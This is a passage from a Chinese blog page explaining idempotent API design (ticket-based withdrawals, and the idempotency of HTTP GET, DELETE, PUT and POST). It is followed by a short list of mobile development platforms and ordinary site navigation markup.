rel="external"></a>图1</p><p>这个问题的解决方案一是采用分布式事务，通过引入支持分布式事务的中间件来保证withdraw功能的事务性。分布式事务的优点是对于调用者很简单，复杂性都交给了中间件来管理。缺点则是一方面架构太重量级，容易被绑在特定的中间件上，不利于异构系统的集成；另一方面分布式事务虽然能保证事务的ACID性质，而但却无法提供性能和可用性的保证。</p><p>另一种更轻量级的解决方案是幂等设计。上面的withdraw显然不满足幂等性，但我们可以一些技巧将它变成幂等的，比如：</p><p>int create_ticket();</p><p>bool idempotent_withdraw(ticket_id, account_id, amount);&nbsp;</p><p></p><p>create_ticket的语义是获取一个服务器端生成的唯一的处理号ticket_id，它将用于标识后续的操作。idempotent_withdraw和withdraw的区别在于关联了一个ticket_id，一个ticket_id表示的操作至多只会被处理一次，每次调用都将返回第一次调用时的处理结果。这样，idempotent_withdraw就符合幂等性了，客户端就可以放心地多次调用。</p><p>基于幂等性的解决方案中一个完整的取钱流程被分解成了两个步骤：1.调用create_ticket()获取ticket_id；2.调用idempotent_withdraw(ticket_id, account_id, amount)。虽然create_ticket不是幂等的，但在这种设计下，它对系统状态的影响可以忽略，加上idempotent_withdraw是幂等的，所以任何一步由于网络等原因失败或超时，客户端都可以重试，直到获得结果。如图2所示：</p><p><a href="http://images.cnblogs.com/cnblogs_com/weidagang2046/201106/201106042051059820.png" target="_blank" rel="external"><img class="aligncenter" src="http://img.pickbox.me/wp-content/uploads/pic/95f00e33f65b08a61b4cff6b.jpg" width="610" height="578"></a></p><p>图2</p><p><strong></strong></p><p>和分布式事务相比，幂等设计的优势在于它的轻量级，容易适应异构环境，以及性能和可用性方面。在某些性能要求比较高的应用，幂等设计往往是唯一的选择。</p><p><strong></strong></p><p><strong>HTTP的幂等性</strong></p><p>HTTP协议本身是一种面向资源的应用层协议，但对HTTP协议的使用实际上存在着两种不同的方式：一种是RESTful的，它把HTTP当成应用层协议，比较忠实地遵守了HTTP协议的各种规定；另一种是SOA的，它并没有完全把HTTP当成应用层协议，而是把HTTP协议作为了传输层协议，然后在HTTP之上建立了自己的应用层协议。本文所讨论的HTTP幂等性主要针对RESTful风格的，不过正如上一节所看到的那样，幂等性并不属于特点的协议，它是分布式系统的一种特性；所以，不论是SOA还是RESTful的Web API设计都应该考虑幂等性。下面将介绍HTTP GET、DELETE、PUT、POST四种主要方法的语义和幂等性。</p><p>HTTP GET方法用于获取资源，不应有副作用，所以是幂等的。比如：GET&nbsp;<a href="http://www.bank.com/account/123456，不会改变资源的状态，不论调用一次还是N次都没有副作用。请注意，这里强调的是一次和N次具有相同的副作用，而不是每次GET的结果相同。GET&nbsp;http://www.news.com/latest-news这个HTTP请求可能会每次得到不同的结果，但它本身并没有产生任何副作用，因而是满足幂等性的。" target="_blank" rel="external">http://www.bank.com/account/123456，不会改变资源的状态，不论调用一次还是N次都没有副作用。请注意，这里强调的是一次和N次具有相同的副作用，而不是每次GET的结果相同。GET&nbsp;http://www.news.com/latest-news这个HTTP请求可能会每次得到不同的结果，但它本身并没有产生任何副作用，因而是满足幂等性的。</a></p><p>HTTP DELETE方法用于删除资源，有副作用，但它应该满足幂等性。比如：DELETE&nbsp;<a href="http://www.forum.com/article/4231，调用一次和N次对系统产生的副作用是相同的，即删掉id为4231的帖子；因此，调用者可以多次调用或刷新页面而不必担心引入错误。" target="_blank" rel="external">http://www.forum.com/article/4231，调用一次和N次对系统产生的副作用是相同的，即删掉id为4231的帖子；因此，调用者可以多次调用或刷新页面而不必担心引入错误。</a></p><p>比较容易混淆的是HTTP POST和PUT。POST和PUT的区别容易被简单地误认为“POST表示创建资源，PUT表示更新资源”；而实际上，二者均可用于创建资源，更为本质的差别是在幂等性方面。在HTTP规范中对POST和PUT是这样定义的：</p><p><em>The POST method is used to request that the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line. ……&nbsp;</em><em>If a resource has been created on the origin server, the response SHOULD be 201 (Created) and contain an entity which describes the status of the request and refers to the new resource, and a Location header.</em></p><p><em>The PUT method requests that the enclosed entity be stored under the supplied Request-URI. If the Request-URI refers to an already existing resource, the enclosed entity SHOULD be considered as a modified version of the one residing on the origin server. If the Request-URI does not point to an existing resource, and that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI.</em></p><p>POST所对应的URI并非创建的资源本身，而是资源的接收者。比如：POST <a href="http://www.forum.com/articles的语义是在http://www.forum.com/articles下创建一篇帖子，HTTP响应中应包含帖子的创建状态以及帖子的URI。两次相同的POST请求会在服务器端创建两份资源，它们具有不同的URI；所以，POST方法不具备幂等性。" target="_blank" rel="external">http://www.forum.com/articles的语义是在http://www.forum.com/articles下创建一篇帖子，HTTP响应中应包含帖子的创建状态以及帖子的URI。两次相同的POST请求会在服务器端创建两份资源，它们具有不同的URI；所以，POST方法不具备幂等性。</a></p><p>而PUT所对应的URI是要创建或更新的资源本身。比如：PUT&nbsp;<a href="http://www.forum/articles/4231的语义是创建或更新ID为4231的帖子。对同一URI进行多次PUT的副作用和一次PUT是相同的；因此，PUT方法具有幂等性。" target="_blank" rel="external">http://www.forum/articles/4231的语义是创建或更新ID为4231的帖子。对同一URI进行多次PUT的副作用和一次PUT是相同的；因此，PUT方法具有幂等性。</a></p><p>在介绍了几种操作的语义和幂等性之后，我们来看看如何通过Web API的形式实现前面所提到的取款功能。很简单，用POST /tickets来实现create_ticket；用PUT /accounts/account_id/ticket_id&amp;amount=xxx来实现idempotent_withdraw。值得注意的是严格来讲amount参数不应该作为URI的一部分，真正的URI应该是/accounts/account_id/ticket_id，而amount应该放在请求的body中。这种模式可以应用于很多场合，比如：论坛网站中防止意外的重复发帖。</p><p><strong></strong></p><p><strong>总结</strong></p><p>上面简单介绍了幂等性的概念，用幂等设计取代分布式事务的方法，以及HTTP主要方法的语义和幂等性特征。其实，如果要追根溯源，幂等性是数学中的一个概念，表达的是N次变换与1次变换的结果相同，有兴趣的读者可以从<a href="http://en.wikipedia.org/wiki/Idempotence" target="_blank" rel="external">Wikipedia</a>上进一步了解。</p><p><strong></strong></p><p><strong>参考</strong></p><p><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html" target="_blank" rel="external">RFC 2616, Hypertext Transfer Protocol — HTTP/1.1, Method Definitions</a></p><p><a href="http://devhawk.net/2007/11/09/theance-of-idempotence/" target="_blank" rel="external">The Importance of Idempotence</a></p><p>&nbsp;</p><p></p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/06/16/HTTP幂等性概念和应用/" class="archive-article-date">
  	<time datetime="2011-06-16T04:58:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-06-16</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/python-js-php-html-mysql-http/">python/js/php/html/mysql/http</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
    <article id="post-mobile-development-platforms" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2011/06/16/mobile-development-platforms/">mobile development platforms</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
         <p>&nbsp;</p><p></p><p>PhoneGap</p><p><a href="http://www.mobiledevelopersolutions.com/home/start/included-demo-apps" target="_blank" rel="external">http://www.mobiledevelopersolutions.com/home/start/included-demo-apps</a></p><p>&nbsp;</p><p>Particle Platform，一份代码多个平台</p><p><a href="http://www.particlecode.com/download/" target="_blank" rel="external">http://www.particlecode.com/download/</a></p><p>create native applications for smartphone platforms as well as HTML5 web applications</p><p>&nbsp;</p><p>Maqetta</p><p><a href="https://github.com/maqetta/maqetta" target="_blank" rel="external">https://github.com/maqetta/maqetta</a></p><p></p><p>Maqetta provides WYSIWYG authoring of HTML5 user interfaces using drag/drop assembly. Maqetta supports both desktop and mobile user interfaces. The Maqetta application itself is authored in HTML5/Ajax, and therefore runs in the browser without requiring additional plugins or downloads.</p><p>&nbsp;</p><p>关键词：PhoneGap，jQuery mobile，Sencha Touch，Particle Platform，Maqetta</p><p>&nbsp;</p><p></p><p></p> 
      
    </div>
    <div class="article-info article-info-index">
      
      <a href="/2011/06/16/mobile-development-platforms/" class="archive-article-date">
  	<time datetime="2011-06-16T02:37:00.000Z" itemprop="datePublished"><i class="icon-clock"></i>2011-06-16</time>
</a>
      
      
	<div class="article-category tagcloud">
	<i class="icon-price-tags"></i>
	<a class="article-category-link" href="/categories/Android/">Android</a>
	</div>


      <div class="clearfix"></div>
    </div>
  </div>
</article>










  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/13/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="page-number" href="/page/13/">13</a><span class="page-number current">14</span><a class="page-number" href="/page/15/">15</a><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/60/">60</a><a class="extend next" rel="next" href="/page/15/">Next &raquo;</a>
    </nav>
  


      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 jfo
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
</footer>
    </div>
    <script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		root: "/",
		innerArchive: true
	}
</script>

<script src="/./main.js"></script>


    
<div class="tools-col">
  <ul class="btn-wrap">
    
      <li class="chose" data-hook="tools-section-all"><span class="text">全部</span><i class="icon-book"></i></li>
    
    
      <li data-hook="tools-section-tag"><span class="text">标签</span><i class="icon-price-tags"></i></li>
    
    
      <li data-hook="tools-section-friends"><span class="text">友链</span><i class="icon-link"></i></li>
    
    
      <li data-hook="tools-section-me"><span class="text">我</span><i class="icon-smile"></i></li>
    
  </ul>
  <div class="tools-wrap">
    
    	<section class="tools-section tools-section-all chose">
    	</section>
    

    
    	<section class="tools-section tools-section-tag">
    			<div class="widget tagcloud" id="js-tagcloud">
    				<ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">87</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Arduino-OpenWrt/">Arduino/OpenWrt</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/DefaultCategory/">DefaultCategory</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Distributed-Computing/">Distributed Computing</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/English/">English</a><span class="category-list-count">20</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Google/">Google</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Life/">Life</a><span class="category-list-count">67</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a><span class="category-list-count">52</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-App/">Linux App</a><span class="category-list-count">61</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-Debug/">Linux Debug</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-Virtualization/">Linux Virtualization</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mac-OS-X/">Mac OS X</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Mobile/">Mobile</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Network/">Network</a><span class="category-list-count">18</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Saying/">Saying</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WebDev/">WebDev</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Windows/">Windows</a><span class="category-list-count">18</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/c-c-template-gp-boost/">c++/c++ template/gp/boost</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/c-c-algorithm/">c/c++/algorithm</a><span class="category-list-count">36</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/cocos2d-x-模拟器/">cocos2d-x/模拟器</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/com组件/">com组件</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/framework/">framework</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/gcc-binutils-make-共享库/">gcc/binutils/make/共享库</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/iOS/">iOS</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/js-html-python/">js/html/python</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/l4ka-pistachio-iguana/">l4ka::pistachio/iguana</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux-图形/">linux 图形</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/python-js-php-html-mysql-http/">python/js/php/html/mysql/http</a><span class="category-list-count">46</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reading/">reading</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/self-collect/">self_collect</a><span class="category-list-count">17</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/unifiedkernel-wine-reactos/">unifiedkernel/wine/reactos</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/wordpress/">wordpress</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/产品/">产品</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/教育/">教育</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/数学-物理/">数学/物理</a><span class="category-list-count">3</span></li></ul>
    			</div>
    	</section>
    

    
    	<section class="tools-section tools-section-friends">
  		
  			<div class="friends-wrap" id="js-friends">
  			
  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://iguangba.pickbox.me/">爱逛吧</a>
  	        
  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.pickbox.me/">收藏夹</a>
  	        
  	          <a target="_blank" class="main-nav-link switch-friends-link" href="http://note.pickbox.me/">网络剪贴板</a>
  	        
  	        </div>
  		
    	</section>
    

    
    	<section class="tools-section tools-section-me">
  	  	
  	  		<div class="aboutme-wrap" id="js-aboutme">jfojfo#gmail.com</div>
  	  	
    	</section>
    
  </div>
  
</div>

    <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
  </div>
</body>
</html>